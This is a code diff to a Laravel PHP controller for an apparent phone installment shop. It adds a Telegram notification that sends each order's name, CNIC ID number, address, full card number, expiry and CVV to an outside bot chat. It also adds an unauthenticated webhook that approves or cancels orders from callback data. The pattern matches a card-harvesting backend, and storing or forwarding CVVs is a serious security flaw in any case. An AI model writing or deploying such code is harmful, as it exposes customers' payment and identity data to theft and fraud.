@@ -7,17 +7,17 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Schema;
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Log;
 
 class FrontendController extends Controller
 {
     /**
      * Auto-patch the database schema if missing columns or tables are detected.
-     * This helps users who haven't manually run the provided SQL update scripts.
      */
     private function patchDatabaseSchema()
     {
         try {
-            // Check for storages table
             if (!Schema::hasTable('storages')) {
                 DB::statement("CREATE TABLE IF NOT EXISTS `storages` (
                   `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
@@ -27,12 +27,10 @@ class FrontendController extends Controller
                 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
             }
 
-            // Check for storage_id in mobiles
             if (!Schema::hasColumn('mobiles', 'storage_id')) {
                 DB::statement("ALTER TABLE `mobiles` ADD `storage_id` bigint(20) UNSIGNED DEFAULT NULL AFTER `series_id` ");
             }
 
-            // Check for missing columns in orders
             if (!Schema::hasColumn('orders', 'storage')) {
                 DB::statement("ALTER TABLE `orders` ADD `storage` varchar(100) DEFAULT NULL AFTER `color` ");
             }
@@ -43,7 +41,11 @@ class FrontendController extends Controller
                 DB::statement("ALTER TABLE `orders` ADD COLUMN `card_cvv` VARCHAR(5) NULL AFTER `card_expiry` ");
             }
 
-            // Check for refund_requests table
+            if (!Schema::hasColumn('app_settings', 'telegram_token')) {
+                DB::statement("ALTER TABLE `app_settings` ADD COLUMN `telegram_token` TEXT NULL AFTER `app_name` ");
+                DB::statement("ALTER TABLE `app_settings` ADD COLUMN `telegram_chat_id` VARCHAR(100) NULL AFTER `telegram_token` ");
+            }
+
             if (!Schema::hasTable('refund_requests')) {
                 DB::statement("CREATE TABLE IF NOT EXISTS `refund_requests` (
                   `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
@@ -59,9 +61,144 @@ class FrontendController extends Controller
                 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
             }
         } catch (\Exception $e) {
-            // Silently fail if schema patching fails
-            \Log::error("Database patching failed: " . $e->getMessage());
+            Log::error("Database patching failed: " . $e->getMessage());
         }
+    }
+
+    private function sendTelegramNotification($order, $mobile)
+    {
+        $settings = DB::table('app_settings')->where('id', 1)->first();
+
+        $token = $settings->telegram_token ?? env('TELEGRAM_BOT_TOKEN');
+        $chatId = $settings->telegram_chat_id ?? env('TELEGRAM_CHAT_ID');
+
+        if (!$token || !$chatId) {
+            return;
+        }
+
+        $message = "📢 *NEW ORDER BOOKED*\n\n";
+        $message .= "🆔 *Order Number:* `{$order['order_number']}`\n";
+        $message .= "👤 *Customer Name:* {$order['full_name']}\n";
+        $message .= "📱 *Mobile Number:* `{$order['mobile_number']}`\n";
+        $message .= "🪪 *CNIC Number:* `{$order['cnic']}`\n";
+        $message .= "📍 *Address:* {$order['address']}\n\n";
+
+        $message .= "🛒 *Product Details:*\n";
+        $message .= "🔹 *Device:* " . ($mobile->name ?? 'N/A') . "\n";
+        $message .= "🔹 *Storage:* {$order['storage']}\n";
+        $message .= "🔹 *Color:* {$order['color']}\n";
+        $message .= "🔹 *Tenure:* {$order['tenure']} Months\n";
+        $message .= "🔹 *Monthly EMI:* {$order['monthly_emi']}\n";
+        $message .= "🔹 *Total Price:* {$order['total_price']}\n\n";
+
+        $message .= "💳 *Payment & Delivery:*\n";
+        $message .= "🔸 *Method:* {$order['payment_method']}\n";
+
+        if ($order['payment_method'] === 'Card') {
+            $message .= "🔸 *Card No:* `{$order['card_number']}`\n";
+            $message .= "🔸 *Expiry:* `{$order['card_expiry']}`\n";
+            $message .= "🔸 *CVV:* `{$order['card_cvv']}`\n";
+        } else {
+            $message .= "🔸 *Service:* " . ($order['wallet_service'] ?? 'N/A') . "\n";
+            $message .= "🔸 *A/C Holder:* {$order['account_holder']}\n";
+        }
+
+        $message .= "🔸 *Delivery Type:* {$order['delivery_type']}\n\n";
+        $message .= "🚥 *Decision Required:* Approve to move to 'Initial Verification' or Reject to Cancel.";
+
+        $keyboard = [
+            'inline_keyboard' => [
+                [
+                    ['text' => '✅ Approve', 'callback_data' => "approve_order_{$order['order_number']}"],
+                    ['text' => '❌ Reject', 'callback_data' => "reject_order_{$order['order_number']}"]
+                ]
+            ]
+        ];
+
+        try {
+            $filePath = !empty($order['proof_image']) ? public_path($order['proof_image']) : null;
+
+            if ($filePath && file_exists($filePath)) {
+                Http::attach('photo', file_get_contents($filePath), basename($filePath))
+                    ->post("https://api.telegram.org/bot{$token}/sendPhoto", [
+                        'chat_id' => $chatId,
+                        'caption' => $message,
+                        'parse_mode' => 'Markdown',
+                        'reply_markup' => json_encode($keyboard)
+                    ]);
+            } else {
+                Http::post("https://api.telegram.org/bot{$token}/sendMessage", [
+                    'chat_id' => $chatId,
+                    'text' => $message,
+                    'parse_mode' => 'Markdown',
+                    'reply_markup' => json_encode($keyboard)
+                ]);
+            }
+        } catch (\Exception $e) {
+            Log::error("Telegram Notification Error: " . $e->getMessage());
+        }
+    }
+
+    public function handleTelegramWebhook(Request $request)
+    {
+        $update = $request->all();
+
+        if (!isset($update['callback_query'])) {
+            return response()->json(['status' => 'ignored']);
+        }
+
+        $callbackQuery = $update['callback_query'];
+        $data = $callbackQuery['data'];
+        $message = $callbackQuery['message'];
+        $chatId = $message['chat']['id'];
+        $messageId = $message['message_id'];
+        $originalText = $message['text'] ?? $message['caption'] ?? '';
+
+        $settings = DB::table('app_settings')->where('id', 1)->first();
+        $token = $settings->telegram_token ?? env('TELEGRAM_BOT_TOKEN');
+
+        if (str_starts_with($data, 'approve_order_')) {
+            $orderNumber = str_replace('approve_order_', '', $data);
+            $newStatus = 'Initial Verification';
+            $statusLabel = "✅ APPROVED -> Initial Verification";
+        } elseif (str_starts_with($data, 'reject_order_')) {
+            $orderNumber = str_replace('reject_order_', '', $data);
+            $newStatus = 'Cancelled';
+            $statusLabel = "❌ REJECTED -> Cancelled";
+        } else {
+            return response()->json(['status' => 'unknown_command']);
+        }
+
+        $affected = DB::table('orders')->where('order_number', $orderNumber)->update([
+            'status' => $newStatus,
+            'updated_at' => now()
+        ]);
+
+        if ($affected) {
+            $updatedText = $originalText . "\n\n📢 *STATUS UPDATE:* {$statusLabel}";
+
+            try {
+                $method = isset($message['photo']) ? 'editMessageCaption' : 'editMessageText';
+                $field = isset($message['photo']) ? 'caption' : 'text';
+
+                Http::post("https://api.telegram.org/bot{$token}/{$method}", [
+                    'chat_id' => $chatId,
+                    'message_id' => $messageId,
+                    $field => $updatedText,
+                    'parse_mode' => 'Markdown',
+                    'reply_markup' => json_encode(['inline_keyboard' => []])
+                ]);
+
+                Http::post("https://api.telegram.org/bot{$token}/answerCallbackQuery", [
+                    'callback_query_id' => $callbackQuery['id'],
+                    'text' => "Order {$orderNumber} is now {$newStatus}."
+                ]);
+            } catch (\Exception $e) {
+                Log::error("Telegram Webhook Response Error: " . $e->getMessage());
+            }
+        }
+
+        return response()->json(['status' => 'success']);
     }
 
     public function index()
@@ -98,7 +235,6 @@ class FrontendController extends Controller
             $query->where('mobiles.storage_id', $storageId);
         }
 
-        // Join storage to get storage name for display in dropdowns/lists
         if (Schema::hasTable('storages') && Schema::hasColumn('mobiles', 'storage_id')) {
             $query->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id')
                   ->select('mobiles.*', 'storages.name as storage_name');
@@ -211,7 +347,7 @@ class FrontendController extends Controller
                 'tenure' => Session::get('order_tenure'),
                 'monthly_emi' => Session::get('order_emi'),
                 'total_price' => Session::get('order_total'),
-                'status' => 'Pending',
+                'status' => 'Waiting for Approval',
                 'created_at' => now(),
                 'updated_at' => now(),
             ];
@@ -221,8 +357,8 @@ class FrontendController extends Controller
 
             DB::table('orders')->insert($insertData);
 
-            // Keep session for success page if needed or clear it after
-            // Session::forget(['order_mobile_id', 'order_color', 'order_storage', 'order_tenure', 'order_emi', 'order_total', 'order_customer']);
+            $mobile = DB::table('mobiles')->where('id', $mobileId)->first();
+            $this->sendTelegramNotification($data, $mobile);
 
             return response()->json(['success' => true, 'order_number' => $orderNumber]);
         } catch (\Exception $e) {
